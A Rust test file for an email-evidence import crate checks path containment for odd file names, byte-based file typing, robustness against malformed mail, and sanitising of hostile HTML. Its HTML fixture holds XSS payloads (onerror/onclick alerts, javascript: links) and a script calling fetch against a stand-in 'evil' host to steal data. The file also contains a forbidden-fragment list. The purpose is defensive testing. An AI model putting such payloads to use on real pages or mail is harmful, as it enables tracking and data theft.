//! D09 验收：敌意输入集中在这里。夹具全部合成，没有任何真实邮件。
//!
//! 断言的是三件事：字节永远落在 `attachments/` 之内；读不懂的东西要么被拒绝要么被当成
//! 文本，绝不 panic；从邮件里出来的正文不含任何可执行片段或远程地址。

use std::fs;
use std::path::{Path, PathBuf};

use evidence_import::{html_to_text, parse_eml, stage_file, stage_text, ImportError};

const BUCKET: &str = "2026/09";

fn archive() -> (tempfile::TempDir, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join("archive");
    fs::create_dir_all(archive.join("attachments")).unwrap();
    (dir, archive)
}

fn none(_sha: &str) -> Option<String> {
    None
}

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let path = dir.join(name);
    fs::write(&path, bytes).unwrap();
    path
}

#[test]
fn nothing_a_file_is_called_can_put_it_outside_the_archive() {
    let (dir, archive) = archive();
    let root = archive.join("attachments").canonicalize().unwrap();
    // 文件名由操作系统给，这里能造出来的都造：真正危险的形状（`..`、盘符、UNC）由
    // safe_file_name 的单元测试覆盖，这里覆盖它们能落在磁盘上的近亲。
    let names = [
        "..dotdot.eml",
        "-leading-dash.eml",
        "space at the end .eml",
        "CON.eml",
        "两百个字符的中文名字也要能存下来.eml",
        "no-extension",
        "\u{202e}reversed.eml",
    ];
    for (index, name) in names.iter().enumerate() {
        let source = write(dir.path(), &format!("{index}.eml"), b"From: a@b.test\r\nSubject: x\r\n\r\n\xe6\xad\xa3\xe6\x96\x87");
        let renamed = dir.path().join(name);
        fs::rename(&source, &renamed).unwrap();
        let staged = stage_file(&archive, &renamed, BUCKET, &none).unwrap();
        let landed = archive.join(&staged.stored_rel_path).canonicalize().unwrap();
        assert!(landed.starts_with(&root), "{name} landed at {landed:?}");
    }
}

#[test]
fn content_that_lies_about_itself_is_judged_by_its_bytes() {
    let (dir, archive) = archive();
    let pdf_as_png = write(dir.path(), "screenshot.png", b"%PDF-1.7\n1 0 obj\n<<>>\nendobj\n");
    assert_eq!(
        stage_file(&archive, &pdf_as_png, BUCKET, &none).unwrap().kind,
        evidence_import::EvidenceKind::Pdf
    );

    let msg_as_eml = write(dir.path(), "invite.eml", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 outlook");
    assert!(matches!(
        stage_file(&archive, &msg_as_eml, BUCKET, &none),
        Err(ImportError::Unsupported { .. })
    ));

    let executable = write(dir.path(), "notes.txt", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00");
    assert!(matches!(
        stage_file(&archive, &executable, BUCKET, &none),
        Err(ImportError::Unsupported { .. })
    ));
}

#[test]
fn empty_and_broken_input_is_handled_without_panicking() {
    let (dir, archive) = archive();
    let empty = write(dir.path(), "empty.txt", b"");
    let staged = stage_file(&archive, &empty, BUCKET, &none).unwrap();
    assert_eq!(staged.size_bytes, 0);
    assert!(archive.join(&staged.stored_rel_path).exists());

    for broken in [
        &b"From: a@b.test\r\nSubject: \xff\xfe broken\r\n\r\n"[..],
        &b"Content-Type: multipart/mixed; boundary=\"b\"\r\n\r\n--b\r\n"[..],
        &b"\r\n\r\n\r\n"[..],
    ] {
        let _ = parse_eml(broken);
    }

    assert!(stage_text(&archive, "", BUCKET, &none).is_ok());
}

#[test]
fn a_hostile_html_mail_cannot_smuggle_anything_into_the_extract() {
    let raw = format!(
        "From: hr@example.test\r\nSubject: 通知\r\nDate: Fri, 12 Sep 2026 08:00:00 +0000\r\n\
         Content-Type: text/html; charset=\"utf-8\"\r\n\r\n{}",
        r#"<html><body>
        <script src="https://evil.example.test/x.js"></script>
        <script>fetch('https://evil.example.test/steal')</script>
        <style>body{background:url(https://evil.example.test/bg.png)}</style>
        <img src="https://tracker.example.test/pixel.gif" onerror="alert(1)">
        <iframe src="https://evil.example.test/frame"></iframe>
        <a href="javascript:alert(1)">点我</a>
        <p onclick="alert(2)">正文在这里</p>
        </body></html>"#
    );
    let mail = parse_eml(raw.as_bytes()).expect("headers are there");
    let text = mail.body_extract.unwrap();

    for forbidden in [
        "<script", "</script", "<iframe", "<style", "onerror", "onclick", "fetch(",
        "evil.example.test/x.js", "pixel.gif", "bg.png",
    ] {
        assert!(!text.contains(forbidden), "{forbidden} survived: {text}");
    }
    assert!(text.contains("正文在这里"), "{text}");
    // `javascript:` 链接只作为文本出现，界面不会把它变成可点的东西。
    assert!(text.contains("点我 <javascript:alert(1)>"), "{text}");
    assert!(mail.had_html);
}

#[test]
fn flattening_html_terminates_on_pathological_markup() {
    // 没有闭合、深层嵌套、超长属性：这些都不该让转换卡住或吐出标签。
    let nested = format!("{}正文{}", "<div>".repeat(500), "</div>".repeat(500));
    assert!(html_to_text(&nested).contains("正文"));
    assert!(!html_to_text("<p>a<b>b<i>c").contains('<'));
    let long_attr = format!("<a href=\"{}\">x</a>", "a".repeat(10_000));
    assert!(html_to_text(&long_attr).starts_with("x <"));
}

#[test]
fn everything_here_ran_without_touching_the_network() {
    // 这个 crate 没有任何网络依赖：接口只吃路径与字节。这条测试是给读代码的人看的
    // 契约，真正的保障是依赖表（infer / sha2 / uuid / mail-parser）和 CSP。
    let (dir, archive) = archive();
    let source = write(dir.path(), "reply.eml", b"From: a@b.test\r\nSubject: x\r\n\r\nbody");
    assert!(stage_file(&archive, &source, BUCKET, &none).is_ok());
}
